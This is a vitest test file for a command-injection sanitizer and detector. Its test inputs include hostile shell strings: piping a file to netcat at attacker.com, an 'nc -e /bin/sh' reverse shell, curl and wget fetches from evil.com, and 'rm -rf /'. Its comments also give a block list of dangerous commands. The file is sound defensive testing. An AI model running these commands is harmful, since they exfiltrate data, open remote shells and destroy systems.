/**
 * Command Injection Sanitizer Tests
 * Tests for src/sanitizers/command.ts
 */

import { describe, it, expect } from 'vitest';
import { sanitizeCommand, detectCommandInjection } from '../../src/sanitizers/command';

describe('sanitizeCommand', () => {
  describe('Shell Metacharacters', () => {
    it('should block semicolon', () => {
      const result = sanitizeCommand('file.txt; rm -rf /');
      expect(result).not.toContain(';');
    });

    it('should block pipe', () => {
      const result = sanitizeCommand('cat file.txt | nc attacker.com 1234');
      expect(result).not.toContain('|');
    });

    it('should block ampersand', () => {
      const result = sanitizeCommand('cmd1 && malicious');
      expect(result).not.toContain('&&');
    });

    it('should block backticks', () => {
      const result = sanitizeCommand('echo `whoami`');
      expect(result).not.toContain('`');
    });

    it('should block $() substitution', () => {
      const result = sanitizeCommand('echo $(whoami)');
      expect(result).not.toContain('$(');
    });

    // Note: Redirects (> <) are NOT in current COMMAND_PATTERNS
    // The pattern only includes: [;&|`$()]
    // Add /[<>]/g to COMMAND_PATTERNS in constants.ts if needed
  });

  describe('Dangerous Commands', () => {
    it('should block rm command', () => {
      const result = sanitizeCommand('rm -rf /');
      expect(result.toLowerCase()).not.toMatch(/\brm\b/);
    });

    // Note: chmod is NOT in current COMMAND_PATTERNS dangerous commands list
    // Current list: cat, ls, rm, mv, cp, wget, curl, nc, bash, sh, python, perl, ruby, php
    // Add 'chmod' to the list in constants.ts if needed

    it('should block curl command', () => {
      const result = sanitizeCommand('curl http://evil.com/shell.sh');
      expect(result.toLowerCase()).not.toMatch(/\bcurl\b/);
    });

    it('should block wget command', () => {
      const result = sanitizeCommand('wget http://evil.com/malware');
      expect(result.toLowerCase()).not.toMatch(/\bwget\b/);
    });

    it('should block nc/netcat command', () => {
      const result = sanitizeCommand('nc -e /bin/sh attacker.com 1234');
      expect(result.toLowerCase()).not.toMatch(/\bnc\b/);
    });

    it('should block bash command', () => {
      const result = sanitizeCommand('bash -c "evil"');
      expect(result.toLowerCase()).not.toMatch(/\bbash\b/);
    });

    it('should block python command', () => {
      const result = sanitizeCommand('python -c "import os; os.system(\"rm -rf /\")"');
      expect(result.toLowerCase()).not.toMatch(/\bpython\b/);
    });
  });

  describe('Safe Input', () => {
    it('should preserve safe filenames', () => {
      const result = sanitizeCommand('document.txt');
      expect(result).toBe('document.txt');
    });

    it('should preserve paths without metacharacters', () => {
      const result = sanitizeCommand('/home/user/file.txt');
      expect(result).toContain('home');
      expect(result).toContain('user');
    });
  });

  describe('Threat Collection', () => {
    it('should collect threat info when requested', () => {
      const result = sanitizeCommand('file.txt; rm -rf /', true);
      expect(result.wasSanitized).toBe(true);
      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats[0].type).toBe('command_injection');
    });

    it('should return no threats for safe input', () => {
      const result = sanitizeCommand('document.txt', true);
      expect(result.wasSanitized).toBe(false);
      expect(result.threats).toHaveLength(0);
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty string', () => {
      const result = sanitizeCommand('');
      expect(result).toBe('');
    });

    it('should handle non-string input', () => {
      const result = sanitizeCommand(123 as unknown as string);
      expect(result).toBe('123');
    });

    it('should handle multiple metacharacters', () => {
      const result = sanitizeCommand('cmd1; cmd2 && cmd3 | cmd4');
      expect(result).not.toContain(';');
      expect(result).not.toContain('&&');
      expect(result).not.toContain('|');
    });
  });
});

describe('detectCommandInjection', () => {
  it('should detect semicolon', () => {
    expect(detectCommandInjection('cmd1; cmd2')).toBe(true);
  });

  it('should detect pipe', () => {
    expect(detectCommandInjection('cmd1 | cmd2')).toBe(true);
  });

  it('should detect backticks', () => {
    expect(detectCommandInjection('echo `whoami`')).toBe(true);
  });

  it('should detect dangerous commands', () => {
    expect(detectCommandInjection('rm file.txt')).toBe(true);
  });

  it('should return false for safe input', () => {
    expect(detectCommandInjection('document.txt')).toBe(false);
  });

  it('should handle non-string input', () => {
    expect(detectCommandInjection(123 as unknown as string)).toBe(false);
  });
});
